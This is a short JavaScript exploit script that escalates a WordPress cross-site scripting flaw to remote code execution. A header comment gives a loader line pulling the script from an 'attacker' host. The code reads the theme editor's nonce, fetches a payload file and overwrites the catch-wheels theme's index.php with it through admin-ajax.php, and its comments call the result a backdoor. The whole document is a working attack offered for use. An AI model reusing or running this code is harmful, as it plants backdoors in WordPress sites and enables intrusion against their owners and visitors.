/*
ESCALATE WORDPRES XSS TO RCE

jQuery.getScript('https://attacker/wordpress_rce.js',function(){main()});
*/

class RCE {
	constructor(){
	/* Empty */
	}

	get_req(url){
		var text;
		jQuery.ajax({
			type: "GET",
			url: url,
			datatype: "text",
			async: false,
			success: function(data){
				text = data;
			}
		});
		return text;
	}

	theme_update(file, csrf){
		/* This function will upload a Backdoor inside the catch-wheel theme*/
		jQuery.ajax({
			type: "POST",
			url: "/wp-admin/admin-ajax.php?_fs_blog_admin=true",
			data: {newcontent : file, _wp_http_referer: '/wp-admin/theme-editor.php?file=index.php&theme=catch-wheels', nonce: csrf, action: 'edit-theme-plugin-file',file: 'index.php',theme: 'catch-wheels', 'docs-list':''},
			success: function(){
				console.log('uploaded');
			},
			contentType: "application/x-www-form-urlencoded"
		});
	}

	boom_p1(csrf){
		/*This function will get your P1. You can now go over Twitter and BOOM P1 everyone*/
		var that = this;
		var payload = that.get_req('http://127.0.0.1/wordpress_rce.txt');
		that.theme_update(payload, csrf);

	}


	get_nonce(){
		/* Retrieving the Nonce used to upload the RCE. Those are really useful and they will never gonna give you up !*/
		var that = this;
		var url = '/wp-admin/theme-editor.php?file=index.php&theme=catch-wheels';
		var data = that.get_req(url);
		return jQuery(data).find('#nonce').val();
	}

	run(){
		var that = this;
		var nonce = that.get_nonce();
		console.log(nonce)
		that.boom_p1(nonce);
	}

}


function main(){
	var exploit = new RCE();
	exploit.run();
}
